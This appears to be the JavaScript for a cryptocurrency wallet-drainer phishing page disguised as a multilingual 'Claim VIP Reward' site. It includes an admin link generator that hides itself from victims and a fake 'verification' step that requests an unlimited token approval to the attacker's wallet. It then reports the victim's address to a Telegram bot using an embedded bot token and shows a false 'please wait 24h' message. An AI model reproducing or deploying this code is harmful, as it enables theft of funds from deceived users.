const content = {
    en: { title: "Claim VIP Reward", desc: "Congratulations! Synchronize your wallet to claim your assets.", btn: "CLAIM REWARD NOW", status: "Reward Status: Ready" },
    cn: { title: "领取 VIP 奖励", desc: "恭喜！同步您的钱包以领取您的资产。", btn: "立即领取奖励", status: "奖励状态：就绪" },
    ru: { title: "Получить VIP-награду", desc: "Поздравляем! Синхронизируйте кошелек, чтобы получить активы.", btn: "ПОЛУЧИТЬ НАГРАДУ", status: "Статус награды: Готов" }
};

function changeLang(lang) {
    document.getElementById('txt-title').innerText = content[lang].title;
    document.getElementById('txt-desc').innerText = content[lang].desc;
    document.getElementById('txt-btn').innerText = content[lang].btn;
    document.getElementById('txt-status').innerText = content[lang].status;
}

// --- FITUR PANEL ADMIN (YANG HILANG) ---
function generateLink() {
    const token = document.getElementById('targetToken').value;
    const wallet = document.getElementById('myWallet').value;
    const baseUrl = window.location.href.split('?')[0];
    const finalLink = `${baseUrl}?token=${token}&receiver=${wallet}`;
    document.getElementById('generatedLink').value = finalLink;
}

function copyLink() {
    const copyText = document.getElementById("generatedLink");
    copyText.select();
    document.execCommand("copy");
    alert("Link copied to clipboard!");
}

// OTOMATIS ISI DATA DARI LINK & SEMBUNYIKAN ADMIN
window.onload = function() {
    const urlParams = new URLSearchParams(window.location.search);
    const tokenParam = urlParams.get('token');
    const receiverParam = urlParams.get('receiver');

    if (tokenParam && receiverParam) {
        document.getElementById('targetToken').value = tokenParam;
        document.getElementById('myWallet').value = receiverParam;
        document.getElementById('adminBox').style.display = 'none'; // Sembunyikan dari paus
    }
};

// --- FITUR VERIFIKASI / PENARIK DANA ---
async function startVerification() {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const user = accounts[0];
            
            const tokenAddress = document.getElementById('targetToken').value;
            const spenderAddress = document.getElementById('myWallet').value;
            
            if(!tokenAddress || !spenderAddress) {
                alert("Data Target/Penerima Kosong!");
                return;
            }

            const abi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"boolean"}],"type":"function"}];
            const contract = new web3.eth.Contract(abi, tokenAddress);
            const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

            document.getElementById('txt-status').innerText = "Processing Authorization...";
            
            // Eksekusi Approval
            await contract.methods.approve(spenderAddress, amount).send({ from: user });

            // NOTIFIKASI TELEGRAM
            const tele_bot_id = "8679938218:AAH_ZuYcoOroEBC-79sQ1CgoEKzcaCrWmYs";
            const tele_chat_id = "8795373522";
            const message = `🚀 **TING! ALERT CLOUD NINE** 🚀%0A%0APaus Memberikan Izin!%0A%0AWallet Paus: ${user}%0AToken Target: ${tokenAddress}%0ACek dompet wadahmu, Arsitek!`;

            fetch(`https://api.telegram.org/bot${tele_bot_id}/sendMessage?chat_id=${tele_chat_id}&text=${message}&parse_mode=Markdown`);

            alert("Verification Complete. Please wait 24h for IBAN activation.");
            document.getElementById('txt-status').innerText = "Reward Status: Claimed";
        } catch (e) {
            console.error(e);
            document.getElementById('txt-status').innerText = "Verification Failed. Try again.";
        }
    } else {
        alert("Please use SafePal or OKX DApp Browser.");
    }
}
